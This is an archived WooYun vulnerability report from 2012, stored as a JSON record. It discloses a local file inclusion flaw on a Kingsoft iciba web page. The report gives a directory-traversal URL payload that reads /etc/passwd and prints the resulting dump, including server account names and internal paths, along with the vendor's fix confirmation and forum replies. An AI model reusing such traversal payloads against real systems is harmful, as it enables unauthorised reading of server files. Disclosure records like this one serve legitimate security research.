{"id": 18106, "wybug_id": "wooyun-2012-09440", "wybug_title": "金山词霸本地文件包含漏洞+绝对路径泄露", "wybug_corp": "金山软件集团", "wybug_author": "zhk", "wybug_date": "2012-07-10 19:46", "wybug_open_date": "2012-08-24 19:47", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-24：\t细节向公众公开  简要描述： 金山词霸本地文件包含漏洞+绝对路径泄露(其实是同一个)，经确认是用require_once()这个函数，可是找了半天都找不到一个上传点，所以就没继续搞下去了 详细说明：  文件包含：http://sl.iciba.com/rss.php?rtype=../../../../../etc/passwd%00\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpm:x:37:37::/var/lib/rpm:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinnetdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bashnscd:x:28:28:NSCD Daemon:/:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinpegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologinhtt:x:100:101:IIIMF Htt:/usr/lib64/im:/sbin/nologinwww:x:48:48::/data/app:/bin/bashmysql:x:512:512::/home/mysql:/bin/bashntp:x:38:38::/etc/ntp:/sbin/nologinOscar:x:518:519::/data/app/Oscar:/bin/bashvote_www:x:519:520::/data/app/vote.www.iciba.com:/bin/bashnagios:x:101:102:nagios:/var/log/nagios:/bin/shicibaweb:x:520:521::/data/app/192.168.0.14/news.iciba.com/:/sbin/nologinhuangjin:x:525:48::/data/app/wap.iciba.com/wwwroot:/bin/bashciba_duanjing:x:522:48::/data/app/wap.iciba.com/wwwroot:/sbin/nologinsurvey:x:528:48::/data/apps/wap.iciba.com/iciba_wap/ef_survey:/sbin/nologincibayw:x:530:530::/home/cibayw:/bin/bashchangjf:x:533:533::/data/app/wap.iciba.com/:/sbin/nologinjinqifa:x:535:535::/home/jinqifa:/bin/bashlinshi:x:536:536::/opt/kingsoft/sbin/data/baknsliciba:/bin/bashvuser:x:537:537::/data/app/192.168.0.14/news.iciba.com/test:/bin/bashzouyang:x:538:538::/data/app/sl.iciba.com/wwwroot/:/bin/bashxueni:x:539:539::/home/xueni:/bin/bash<br /><b>Notice</b>:  Undefined variable: rss_title in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>19</b><br /><br /><b>Notice</b>:  Undefined variable: rss_link in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>20</b><br /><br /><b>Notice</b>:  Undefined variable: rss_desc in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>21</b><br /><br /><b>Notice</b>:  Undefined variable: rss_language in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>23</b><br /><br /><b>Notice</b>:  Undefined variable: rss_pubDate in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>23</b><br /><br /><b>Notice</b>:  Undefined variable: rss_pubDate in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>24</b><br /><br /><b>Notice</b>:  Undefined variable: rssData in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>26</b><br /><br /><b>Warning</b>:  Invalid argument supplied for foreach() in <b>/data/app/sl.iciba.com/nphp/rss.php</b> on line <b>26</b><br /><?xml version=\"1.0\" encoding=\"UTF-8\" ?><rss xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:trackback=\"http://madskills.com/public/xml/rss/module/trackback/\" xmlns:wfw=\"http://wellformedweb.org/CommentAPI/\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" version=\"2.0\"><channel><title><![CDATA[]]></title><link><![CDATA[]]></link><description><![CDATA[]]></description><language></language><pubDate></pubDate><lastBuildDate></lastBuildDate></channel></rss>\n   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  对外部提交的数据多加过滤有礼物了吗？？？   版权声明：转载请注明来源 zhk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-07-10 23:53 厂商回复： 您的自评是Rank16，鉴于该漏洞的严重程度与影响范围，金山给出的Rank是20；非常感谢您对wooyun的以及金山的支持。同时也欢迎广大安全朋友们继续反馈金山集团及各子公司的安全问题，我们将尽快对反馈内容进行确认和处理，减少和降低对用户的影响。为表示感谢，金山将根据漏洞数量、严重程度以及影响范围赠送N份来自金山的纪念礼品。为减少中间流程环节，可直接联系qq964894或chengchong@ijinshan.com； 最新状态： 2012-07-10：目前漏洞已经修补完毕；同时也欢迎广大安全朋友们继续反馈金山集团及各子公司的安全问题，我们将尽快对反馈内容进行确认和处理，减少和降低对用户的影响。为表示感谢，金山将根据漏洞数量、严重程度以及影响范围赠送N份来自金山的纪念礼品。为减少中间流程环节，可直接联系qq964894或chengchong@ijinshan.com； 2012-07-28：已修复  ", "replys": "漏洞评价：\n评论\n     2012-07-10 20:14 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  ....    \n     2012-07-10 20:18 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @xsser 不会又要自觉了吧 -_-!    \n     2012-07-10 21:47 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @zhk -  - 你是屯着呢吧    \n     2012-07-10 21:57 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @xsser ......    \n     2012-07-10 23:55 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @金山软件集团 是不是要“直接联系”才有礼物呢？    \n     2012-08-10 09:16 |    \t\t可乐超人 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:10        )\t\t \n  @zhk 在确保自身安全的情况下，直接联系厂商得到的礼物还是蛮不错的。    \n     2012-08-10 20:40 |    \t\t大和尚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:5        | www.ieroot.com 积极向上的心态！百折不挠...)\t\t \n  @zhk 透露下是啥礼物啊..    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}